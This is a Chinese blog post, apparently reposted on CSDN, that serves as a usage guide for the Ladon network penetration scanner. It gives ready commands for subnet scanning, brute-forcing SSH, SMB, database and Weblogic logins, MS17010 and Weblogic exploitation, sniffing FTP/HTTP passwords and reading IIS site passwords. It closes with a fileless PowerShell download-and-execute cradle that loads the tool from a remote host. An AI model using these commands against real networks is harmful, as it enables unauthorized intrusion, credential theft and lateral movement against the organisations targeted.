**目录**

[程序简介](#t0 "程序简介")

[使用说明](#t1 "使用说明")

[运行环境](#t2 "运行环境")

[Windows](#t3 "Windows")

[Linux](#t4 "Linux")

[程序参数功能](#t5 "程序参数功能")

[内置功能模块](#t6 "内置功能模块")

[0x001 资产扫描](#t7 "0x001 资产扫描")

[​0x002 指纹识别/服务识别](#t8 "​0x002 指纹识别/服务识别")

[配置端口扫描参数](#t9 "配置端口扫描参数")

[0x003 口令检测/密码爆破](#t10 "0x003 口令检测/密码爆破")

[网站密码](#t11 "网站密码")

[文件密码](#t12 "文件密码")

[数据库口令检测](#t13 "数据库口令检测")

[0x004 漏洞检测/漏洞利用](#t14 "0x004 漏洞检测/漏洞利用")

[0x005 加密解密](#t15 "0x005 加密解密")

[0x006 下载功能](#t16 "0x006 下载功能")

[0x007 网络嗅探](#t17 "0x007 网络嗅探")

[0x008 密码读取](#t18 "0x008 密码读取")

[外部插件模块(10)](#t19 "外部插件模块(10)")

[中级用法](#t20 "中级用法")

[批量扫描](#t21 "批量扫描")

[禁ping扫描](#t22 "禁ping扫描")

[PowerShell](#t23 "PowerShell")

[0x001 PowerShell本地加载](#t24 "0x001 PowerShell本地加载")

[0x002 Cmd本地加载](#t25 "0x002 Cmd本地加载")

[0x003 Cmd远程加载](#t26 "0x003 Cmd远程加载")

* * *

项目地址：[https://github.com/k8gege/Ladon](https://github.com/k8gege/Ladon "https://github.com/k8gege/Ladon")

程序简介
====

Ladon一款用于大型网络渗透的[多线程](https://so.csdn.net/so/search?q=%E5%A4%9A%E7%BA%BF%E7%A8%8B&spm=1001.2101.3001.7020)插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.7版本内置40个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。

使用说明
====

| ID | 主题 | URL |
| --- | --- | --- |
| 1 | Ladon完整文档 | [https://github.com/k8gege/Ladon/wiki](https://github.com/k8gege/Ladon/wiki "https://github.com/k8gege/Ladon/wiki") |
| 2 | 基础用法详解 | [Ladon Usage · k8gege/Ladon Wiki · GitHub](https://github.com/k8gege/Ladon/wiki/Ladon-Usage "Ladon Usage · k8gege/Ladon Wiki · GitHub") |
| 3 | Cobalt Strike | [GitHub - k8gege/Aggressor: Ladon for Cobalt Strike, Large Network Penetration Scanner, vulnerability / exploit / detection / MS17010 / password/brute-force/psexec/atexec/sshexec/webshell/smbexec/netcat/osscan/netscan/struts2Poc/weblogicExp](https://github.com/k8gege/Aggressor "GitHub - k8gege/Aggressor: Ladon for Cobalt Strike, Large Network Penetration Scanner, vulnerability / exploit / detection / MS17010 / password/brute-force/psexec/atexec/sshexec/webshell/smbexec/netcat/osscan/netscan/struts2Poc/weblogicExp") |
| 4 | Exp生成器使用 | [https://github.com/k8gege/Ladon/wiki/LadonExp-Usage](https://github.com/k8gege/Ladon/wiki/LadonExp-Usage "https://github.com/k8gege/Ladon/wiki/LadonExp-Usage") |
| 5 | 高度自定义插件 | [https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle](https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle "https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle") |
| 6 | 外部模块参考 | [https://github.com/k8gege/K8CScan/wiki](https://github.com/k8gege/K8CScan/wiki "https://github.com/k8gege/K8CScan/wiki") |
| 7 | PowerShell | [GitHub - k8gege/PowerLadon: Ladon Network Penetration Scanner for PowerShell, vulnerability / exploit / detection / MS17010/SmbGhost,Brute-Force SMB/IPC/WMI/NBT/SSH/FTP/MSSQL/MYSQL/ORACLE/VNC](https://github.com/k8gege/powerladon "GitHub - k8gege/PowerLadon: Ladon Network Penetration Scanner for PowerShell, vulnerability / exploit / detection / MS17010/SmbGhost,Brute-Force SMB/IPC/WMI/NBT/SSH/FTP/MSSQL/MYSQL/ORACLE/VNC") |
| 8 | Python Ladon | [https://github.com/k8gege/PyLadon](https://github.com/k8gege/PyLadon "https://github.com/k8gege/PyLadon") |
| 9 | Kali Ladon | [GitHub - k8gege/KaliLadon: Ladon for Linux (Kali), Large Network Penetration Scanner, vulnerability / exploit / detection / MS17010 / password](https://github.com/k8gege/KaliLadon "GitHub - k8gege/KaliLadon: Ladon for Linux (Kali), Large Network Penetration Scanner, vulnerability / exploit / detection / MS17010 / password") |
| 10 | 漏洞演示视频 | [K8CScan/Video at master · k8gege/K8CScan · GitHub](https://github.com/k8gege/K8CScan/tree/master/Video "K8CScan/Video at master · k8gege/K8CScan · GitHub") |
| 11 | Ladon6.0文档 | [Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破 | K8哥哥’s Blog](https://k8gege.org/p/56393.html "Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破 |        K8哥哥’s Blog") |

运行环境
====

Windows
-------

Ladon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)。如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用。

Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透。

Linux
-----

安装Mono运行库,将KaliLodan改名为Ladon,通过mono执行Ladon即可。

```
 apt install mono-runtime      
 wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon      
 mono Ladon 192.168.1.8/24 OnlinePC
```


由于mono的兼容性问题，不保证Linux下所有功能均可用。就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好。测试发现有些功能的稳定性以及速度没有Windows系统快。未列功能系未测试或暂不可用功能，使用前请先看说明。

程序参数功能
======

1.  支持指定IP扫描
    
2.  支持指定域名扫描
    
3.  支持指定机器名扫描
    
4.  支持指定C段扫描(ip/24)
    
5.  支持指定B段扫描(ip/16)
    
6.  支持指定A段扫描(ip/8)
    
7.  支持指定URL扫描
    
8.  支持批量IP扫描(ip.txt)
    
9.  支持批量C段扫描(ip24.txt)
    
10.  支持批量B段扫描(ip16.txt)
    
11.  支持批量URL扫描(url.txt)
    
12.  支持批量域名扫描(domain.txt)
    
13.  支持批量机器名扫描(host.txt)
    
14.  支持批量字符串列表(str.txt)
    
15.  支持主机帐密列表(check.txt)
    
16.  支持用户密码列表(userpass.txt)
    
17.  支持指定范围C段扫描
    
18.  支持参数加载自定义DLL（仅限C#）
    
19.  支持参数加载自定义EXE（仅限C#）
    
20.  支持参数加载自定义INI配置文件
    
21.  支持参数加载自定义PowerShell
    
22.  支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)
    
23.  插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)
    
24.  支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)
    

内置功能模块
======

0x001 资产扫描
----------

*   Ladon 192.168.10.0/24 OnlinePC
    
*   Ladon 192.168.10.0/24 OnlineIP
    

| ID | 模块名称 | 功能说明 | 返回结果 |
| --- | --- | --- | --- |
| 1 | OnlinePC | 存活主机扫描 | 存活IP、Mac地址、机器名、Vmware |
| 2 | OnlineIP | 仅存活主机IP | 存活IP |
| 3 | UrlScan | URL域名扫描 | 同服URL（不验证IP、域名、Web标题） |
| 4 | SameWeb | 同服域名扫描 | 同服URL（验证IP、域名、Web标题） |
| 5 | WebScan | Web信息扫描 | 存活IP、主机名、Banner、Web标题 |
| 6 | WebDir | 后台目录扫描 | 地址、HTTP状态 |
| 7 | SubDomain | 子域名爆破 | 子域名 (可用DomainIP/HostIP解析) |
| 8 | DomainIP | 域名解析IP | 域名、IP |
| 9 | HostIP | 主机名转IP | IP、域名 |

![](https://img-blog.csdnimg.cn/20200524174954354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
0x002 指纹识别/服务识别
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

*   Ladon 192.168.10.0/24 OsScan
    
*   Ladon 192.168.10.0/24 PortScan
    
*   Ladon 192.168.10.0/24 EnumShare
    

| ID | 模块名称 | 功能说明 | 返回结果 |
| --- | --- | --- | --- |
| 1 | OsScan | 操作系统版本探测 | 存活IP、工作组\\机器名、操作系统、 |
| 2 | PortScan | 端口扫描含Banner | 主机名、开放端口、服务识别、Banner、Web标题 |
| 3 | WhatCMS | 75种Web指纹识别 | URL、CMS版本、登陆页面、中间件等 |
| 4 | CiscoScan | 思科设备扫描 | 存活IP、设备型号、主机名、Boot、硬件版本 |
| 5 | EnumMssql | 枚举MsSQL数据库主机 | 数据库IP、机器名、SQL版本 |
| 6 | EnumShare | 枚举网络共享资源 | 域、存活IP、共享路径 |

![](https://img-blog.csdnimg.cn/20200524175023504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200524175039296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **配置端口扫描参数**

使用PortScan模块时，默认扫描常见高危漏洞端口，也可以自定义要扫描的端口，指定 port.txt 文件，port.txt 文件格式如下。

格式1：80,21,1433,3306,445

格式2：80-88,21-23,5800-5900

格式3：

*   21
    
*   23
    
*   80
    

格式4：

*   80-88
    
*   21-23
    

0x003 口令检测/密码爆破
---------------

| ID | 模块名称 | 功能说明 | 返回结果 | 依赖 |
| --- | --- | --- | --- | --- |
| 1 | WmiScan | Wmi密码爆破(Windowns) | 检测状态以及正确密码日志 |  |
| 2 | IpcScan | Ipc密码爆破(Windows) | 检测状态以及正确密码日志 |  |
| 3 | SmbScan | SMB密码爆破(Windows) | 检测状态以及正确密码日志 | SharpCifs.dll |
| 4 | SshScan | SSH密码爆破(Linux) | 检测状态以及正确密码日志 | Renci.SshNet.dll |
| 5 | MssqlScan | Mssql数据库密码爆破 | 检测状态以及正确密码日志 |  |
| 6 | OracleScan | Oracle数据库密码爆破 | 检测状态以及正确密码日志 | DDTek.Oracle.dll |
| 7 | MysqlScan | Mysql数据库密码爆破 | 检测状态以及正确密码日志 | MySql.Data.dll |
| 8 | WeblogicScan | Weblogic后台密码爆破 | 检测状态以及正确密码日志 |  |
| 9 | VncScan | VNC远程桌面密码爆破 | 检测状态以及正确密码日志 | VncSharp.dll |
| 10 | FtpScan | Ftp服务器密码爆破 | 检测状态以及正确密码日志 |  |
| 11 | RarScan | Rar压缩包密码爆破 | 检测状态以及正确密码日志 | Rar.exe |
| 12 | TomcatScan | Tomcat后台登陆密码爆破 | 检测状态以及正确密码日志 |  |
| 13 | HttpBasicScan | HttpBasic401认证密码爆破 | 检测状态以及正确密码日志 |  |
| 14 | LdapScan | LdapScan域服务器密码爆破 | 检测状态以及正确密码日志 |  |

在Ladon.exe同级目录下创建user.txt和pass.txt文件。

*   爆破SSH服务(默认22端口): Ladon 192.168.10.1/24 SshScan
    
*   爆破单个IP，指定端口：Ladon 192.168.10.13 22 SshScan
    

![](https://img-blog.csdnimg.cn/20200524175122780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2020052417513718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者在Ladon.exe同级目录下创建userpass.txt文件。

*   爆破SSH服务(默认22端口)，自己指定主机端口: Ladon 192.168.10.0/24 SshScan

![](https://img-blog.csdnimg.cn/20200524175202451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

对于破解指定IP，用户名，密码的话，我们则可以在Ladon.exe同级目录下创建check.txt，check,txt文件格式为一行放上 IP 端口 用户名 密码，不指定端口的话则为默认端口。这里需要注意的是，各个数据之间为一个空格。

*   Ladon.exe SshScan
    

![](https://img-blog.csdnimg.cn/20200524175237590.png)

![](https://img-blog.csdnimg.cn/20200524175250124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

爆破SMB服务：Ladon.exe SmbScan

![](https://img-blog.csdnimg.cn/20200524175310271.png)

### 网站密码

如：weblogic

check.txt格式如下

```
http://192.168.1.8:7001/console weblogic root
```


命令: Ladon WeblogicScan

### 文件密码

因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码

命令: Ladon test.rar RarScan

### 数据库口令检测

数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行。MySQL不受影响，SQLServer和Oracle受此影响。所以，SQLServer和Oracle除了指定user.txt、pass.txt和userpass.txt外，使用下面的check.exe可以指定连接指定库。

**MSSQL数据库密码验证指定连接库**

非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描

check.txt格式如下

```
192.168.1.8 1433 master sa root
```


命令：Ladon MssqlScan

![](https://img-blog.csdnimg.cn/20200524175349557.png)

**Oracle数据库密码验证指定连接库**

check.txt格式如下

```
192.168.1.8 1521 orcl system root
```


命令: Ladon OracleScan

0x004 漏洞检测/漏洞利用
---------------

例子: Ladon 192.168.10.1/24 MS17010

例子: Ladon [http://192.168.10.1](http://192.168.10.1 "http://192.168.10.1") WeblogicExp

| ID | 模块名称 | 功能说明 |
| --- | --- | --- |
| 1 | MS17010 | SMB漏洞检测(CVE-2017-0143/CVE-2017-0144/CVE-2017-0145/CVE-2017-0146/CVE-2017-0148) |
| 2 | WeblogicPoc | Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894) |
| 3 | PhpStudyPoc | PhpStudy后门检测(phpstudy 2016/phpstudy 2018) |
| 4 | ActivemqPoc | ActiveMQ漏洞检测(CVE-2016-3088) |
| 5 | TomcatPoc | Tomcat漏洞检测(CVE-2017-12615) |
| 6 | WeblogicExp | Weblogic漏洞利用(CVE-2019-2725) |
| 7 | TomcatExp | Tomcat漏洞利用(CVE-2017-12615) |
| 8 | Struts2Poc | Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode) |

![](https://img-blog.csdnimg.cn/20200524175418935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

0x005 加密解密
----------

例子: Ladon 字符串 EnHex

例子: Ladon EnHex (批量str.txt)

| ID | 模块名称 | 功能说明 |
| --- | --- | --- |
| 1 | EnHex | 批量Hex密码加密 |
| 2 | DeHex | 批量Hex密码解密 |
| 3 | EnBase64 | 批量Base64密码加密 |
| 4 | DeBase64 | 批量Base64密码解密 |

0x006 下载功能
----------

下载功能主要用于内网文件传输或者将VPS文件下载至目标机器

| ID | 模块名称 | 功能说明 | 用法 |
| --- | --- | --- | --- |
| 1 | HttpDownLoad | HTTP下载 | Ladon HttpDownLoad [https://k8gege.org/test.exe](https://k8gege.org/test.exe "https://k8gege.org/test.exe") |
| 2 | FtpDownLoad | Ftp下载 | Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe |

0x007 网络嗅探
----------

基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限，主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码，后续可能会添加其它功能可能另外写个专门用于嗅探的工具。

PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。

重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M

当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)

| ID | 模块名称 | 功能说明 | 用法 |
| --- | --- | --- | --- |
| 1 | FtpSniffer/SnifferFtp | Ftp密码嗅探 | Ladon FtpSniffer 192.168.1.5 |
| 2 | HttpSniffer/SnifferHTTP | HTTP密码嗅探 | Ladon HTTPSniffer 192.168.1.5 |
| 3 | Sniffer | 网络嗅探(源地址、目标地址) | Ladon Sniffer |

0x008 密码读取
----------

| ID | 模块名称 | 功能说明 | 用法 |
| --- | --- | --- | --- |
| 1 | EnumIIS/IisWeb | IIS站点密码读取 | Ladon EnumIIS 或 Ladon IisWeb |
| 2 | EnumProcess/ProcessList/tasklist | 进程详细信息 | Ladon EnumProcess 或 Ladon Tasklist |
| 3 | GetCmdLine/CmdLine | 获取命令行参数 | Ladon cmdline 或 Ladon cmdline cmd.exe |
| 4 | GetInfo/GetInfo2 | 获取渗透基础信息 | Ladon GetInfo 或Ladon GetInfo2 |

注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档，中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用，高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。

外部插件模块(10)
==========

| ID | 功能 | 实现语言 | 功能说明 |
| --- | --- | --- | --- |
| 1 | 漏洞扫描 | C语言 | [CVE 2019-0708 Windows Rdp 3389漏洞批量检测](https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-0708-Windows-Rdp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C "CVE 2019-0708 Windows Rdp 3389漏洞批量检测") |
| 2 | 漏洞利用 | Exp生成器 | [ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit](https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-ThinkPHP-5.0.22-5.1.29-RCE-GetShell-Exploit "ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit") |
| 3 | 漏洞利用 | Python | [CVE-2019-9621 Zimbra GetShell Exploit](https://github.com/k8gege/ZimbraExploit "CVE-2019-9621 Zimbra GetShell Exploit") |
| 4 | 漏洞利用 | Python | [CVE-2019-0604 SharePoint GetShell Exploit](https://github.com/k8gege/CVE-2019-0604 "CVE-2019-0604 SharePoint GetShell Exploit") |
| 5 | 漏洞利用 | Exp生成器 | [CVE 2016-3088 ActiveMQ GetShell Exploit](https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-3088-ActiveMQ-GetShell-Exploit "CVE 2016-3088 ActiveMQ GetShell Exploit") |
| 6 | 漏洞利用 | Python | [Apache Solr 8.2.0 Velocity RCE 0day Exploit](https://github.com/k8gege/SolrExp "Apache Solr 8.2.0 Velocity RCE 0day Exploit") |
| 7 | 漏洞利用 | Exp生成器 | [PhpStudy后门 GetShell Exploit](https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8 "PhpStudy后门 GetShell Exploit") |
| 8 | 命令执行 | INI配置 | [INI调用外部程序命令批量Linux上控](https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FSSH%E4%B8%8A%E6%8E%A7 "INI调用外部程序命令批量Linux上控") |
| 9 | 命令执行 | INI配置 | [INI调用外部程序命令批量Windowns上控](https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FWin%E4%B8%8A%E6%8E%A7 "INI调用外部程序命令批量Windowns上控") |
| 10 | 漏洞扫描 | Python | [PHP-FPM 远程代码执行漏洞(CVE-2019-11043)](https://github.com/k8gege/CVE-2019-11043 "PHP-FPM 远程代码执行漏洞(CVE-2019-11043)") |
| 11 | 漏洞扫描 | Exp生成器 | [Weblogic CVE-2018-2894漏洞检测](https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894 "Weblogic CVE-2018-2894漏洞检测") |
| 12 | 漏洞利用 | PowerShell | [MS17010EXP 永恒之蓝漏洞利用](https://github.com/k8gege/MS17010EXP "MS17010EXP 永恒之蓝漏洞利用") |
| 13 | 脚本调用 | PowerShell | [Kali 2019无PowerShell执行脚本](https://k8gege.org/p/32e1a912.html "Kali 2019无PowerShell执行脚本") |

文档参考Cscan: [Home · k8gege/K8CScan Wiki · GitHub](https://github.com/k8gege/K8CScan/wiki "Home · k8gege/K8CScan Wiki · GitHub")

中级用法
====

批量扫描
----

0x001： 参数 ip/24 ip/16 ip/8

*   命令：Ladon 192.168.1.8/24 OnlinePC

0x002： 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt

程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt

无需指定txt程序会自动加载文件进行扫描，如扫描存活主机只需命令: Ladon OnlinePC

禁ping扫描
-------

默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网，或者目标机器禁ping时，需要指定禁ping扫描。但是使用noping参数进行扫描,速度稍慢一点

*   Ladon noping
    
*   Ladon noping 192.168.1.8/24
    
*   Ladon noping 192.168.1.8/24 MS17010
    

![](https://img-blog.csdnimg.cn/20200524175814845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

PowerShell
==========

PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用 PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。

0x001 PowerShell本地加载
--------------------

在powershell窗口下执行

```
Import-Module .\Ladon.ps1;Ladon OnlinePC
```


![](https://img-blog.csdnimg.cn/20200524175839408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

0x002 Cmd本地加载
-------------

在cmd窗口下执行

```
powershell Import-Module .\Ladon.ps1;Ladon OnlinePC
```


![](https://img-blog.csdnimg.cn/20200524175916110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

0x003 Cmd远程加载
-------------

在cmd窗口远程加载

```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://xx.xx.xx.xx/Ladon.ps1'); Ladon OnlinePC"
```


  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)